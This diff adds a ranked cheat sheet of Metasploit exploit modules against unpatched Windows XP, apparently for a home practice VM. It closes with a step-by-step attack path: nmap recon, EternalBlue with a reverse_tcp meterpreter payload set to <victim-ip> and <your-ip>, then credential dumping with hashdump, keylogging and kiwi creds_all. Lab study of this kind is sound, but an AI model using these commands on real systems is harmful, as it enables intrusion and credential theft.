@@ -1,0 +1,179 @@
+==============================================================================
+  Metasploit Windows XP Exploit Modules - Complete Ranked List
+==============================================================================
+
+XP SP3 English (no patches) is the ideal target.  Meterpreter requires SP2+ on
+modern MSF (v6+).  For SP0/SP1, use windows/shell/reverse_tcp instead.
+
+Default open ports: 445 (SMB), 139 (NetBIOS), 135 (DCOM/RPC)
+Optional: 3389 (RDP), 80 (IIS)
+
+---
+
+  S-TIER: LEGENDARY (remote, no creds, instant SYSTEM)
+
+  1.  exploit/windows/smb/ms17_010_eternalblue         10/10
+      NSA leak.  Kernel ring-0 via pool grooming.
+      Port 445.  Works on XP SP0-SP3.
+      Used by WannaCry.  The most devastating public exploit ever.
+
+  2.  exploit/windows/smb/ms08_067_netapi               10/10
+      Stack buffer overflow in Server service.
+      Port 445/139.  72 targets across all SPs/languages.
+      NX bypass on SP2/SP3.  The one everyone learns on.
+
+  3.  exploit/windows/smb/smb_doublepulsar_rce           9/10
+      The other half of the NSA toolkit.
+      Injects a backdoor into SMB itself.  Very meta.
+
+  4.  exploit/windows/smb/ms09_050_smb2_negotiate       8/10
+      SMBv2 function table dereference.
+      Elegant protocol negotiation exploit.
+
+  5.  exploit/windows/dcerpc/ms03_026_dcom               7/10
+      The Blaster worm vector.  Port 135.
+      Vintage 2003.  Historic significance.
+
+  6.  exploit/windows/smb/ms06_040_netapi                6/10
+      Predecessor to MS08-067.  Same NetAPI32.dll.
+      Want to see where MS08-067 evolved from? Run this first.
+
+  7.  exploit/windows/smb/ms05_039_pnp                   5/10
+      Plug and Play service overflow.  Clean SEH-based.
+
+  8.  exploit/windows/smb/ms04_011_lsass                 5/10
+      LSASS overflow.  Sasser worm.
+      Need to run it twice on XP.
+
+  9.  exploit/windows/smb/ms04_031_netdde                4/10
+      NetDDE service.  Obscure protocol.
+
+  10. exploit/windows/smb/ms09_001_write                 4/10
+      SMB WriteAndX.  Simple but reliable.
+
+---
+
+  A-TIER: BROWSER CLIENT-SIDE (user clicks link)
+
+  11. exploit/windows/browser/ms07_017_ani_loadimage    8/10
+      ANI cursor exploit.  "Cursor of death."
+      Works across IE6/7 AND Firefox.
+      A malicious cursor file that pwns your box.
+
+  12. exploit/windows/browser/ms06_001_wmf_setabortproc 7/10
+      Windows Metafile Escape().  Open an image -> code exec.
+      One of the first "picture that hacks you" bugs.
+
+  13. exploit/windows/browser/ms14_064_ole_code_exec    6/10
+      OLE Package Manager.  HTA attack vector.
+
+  14. exploit/windows/browser/ms10_002_ie_object         6/10
+      IE Aurora.  Google attack.  China-linked APT.
+      Real cyberwar history.
+
+  15. exploit/windows/browser/ms11_093_ole32             6/10
+      XP SP3 only.  OLE32 type confusion.
+      Requires Visio Viewer.  Niche but elegant.
+
+  16. exploit/windows/browser/ms08_078_flash_overflow    5/10
+      The "Flash b0at" bug from HITB.
+
+  17. exploit/windows/browser/ms06_055_vml               5/10
+      Vector Markup Language.  Evil HTML.
+
+  18. exploit/windows/browser/ms06_013_ie_createcontrol  4/10
+
+  19. exploit/windows/browser/ms06_014_mdac              4/10
+
+  20. exploit/windows/browser/ms06_057_webviewfoldericon 4/10
+
+  21. exploit/windows/browser/ms07_045_ie_languagepack   4/10
+
+  22. exploit/windows/nntp/ms05_030_nntp                 4/10
+      Outlook Express NNTP parsing.
+
+  23. (various IE DHTML/style bugs: ms13-009, ms13-022,
+      ms13-037, ms13-055, ms13-080, ms14-012, ms14-021,
+      ms14-035, ms15-018, ms15-032, ms15-065, etc.)     3/10
+      Same pattern, less novelty each time.
+
+---
+
+  B-TIER: AUTHENTICATED / SERVICE-SPECIFIC
+
+  24. exploit/windows/smb/ms06_070_wkssvc                5/10
+      Workstation service.  Exploits via domain join logic.
+      Needs creds.  Clever vector.
+
+  25. exploit/windows/smb/ms06_025_rras                  4/10
+      Routing and RAS.  Needs creds on 2K, pipe trick on SP1.
+
+  26. exploit/windows/smb/ms05_027_netapi                3/10
+
+  27. exploit/windows/smb/generic_smb_dll_injection      3/10
+      DLL injection via SMB.  Need creds.
+
+---
+
+  C-TIER: LOCAL PRIVILEGE ESCALATION (need foothold)
+
+  28. exploit/windows/local/ms10_015_kitrap0d            7/10
+      KiTrap0D.  Undocumented CPU opcode -> ring 0.
+      Uses 'int 0x2b'.  Legendary in exploit dev circles.
+
+  29. exploit/windows/local/ms09_012_churrasco           5/10
+      Used in Stuxnet's early days.  SEH-based.
+
+  30. exploit/windows/local/ms10_092_schelevator         4/10
+      Task Scheduler "elevator" to SYSTEM.
+
+  31. exploit/windows/local/ms14_058_track_popup_menu    4/10
+      Win32k TrackPopupMenu bug.
+
+  32. exploit/windows/local/ms10_073_kbdlayout           3/10
+      Keyboard layout.  Obscure.
+
+  33. exploit/windows/local/ms11_080_afdjoinleaf         3/10
+      AFD.sys join leaf.
+
+---
+
+  D-TIER: OTHER SERVICES
+
+  34. exploit/windows/ssl/ms04_011_pct                   5/10
+      SSL PCT overflow.  Needs SSL listener (IIS).
+
+  35. exploit/windows/ftp/warftpd_165_pass               3/10
+      WarFTPd 1.65 pass overflow.
+
+  36. exploit/windows/iis/ms02_018_htr                   3/10
+      IIS HTR overflow.  Ancient.
+
+  37. exploit/windows/licensing/ms05_010                 2/10
+      Licensing service.  Very obscure.
+
+  38. exploit/windows/rdp/ms12_020_maxchannelids         1/10
+      RDP crash/DoS only.  No code exec.  Skip this.
+
+---
+
+  RECOMMENDED "FULL PWN" PATH
+
+  1. Recon:        nmap -p 445,139,135 <target>
+  2. Exploit:      ms17_010_eternalblue  (or ms08_067_netapi)
+  3. Escalate:     (already SYSTEM from those)
+  4. Post:         hashdump, screenshot, keylog
+  5. For fun:      load kiwi, creds_all
+
+  Quick start for your VM:
+
+    msfconsole
+    use exploit/windows/smb/ms17_010_eternalblue
+    set RHOSTS <victim-ip>
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp
+    set LHOST <your-ip>
+    run
+
+  (use x86 payload for 32-bit XP, obviously)
+
+==============================================================================
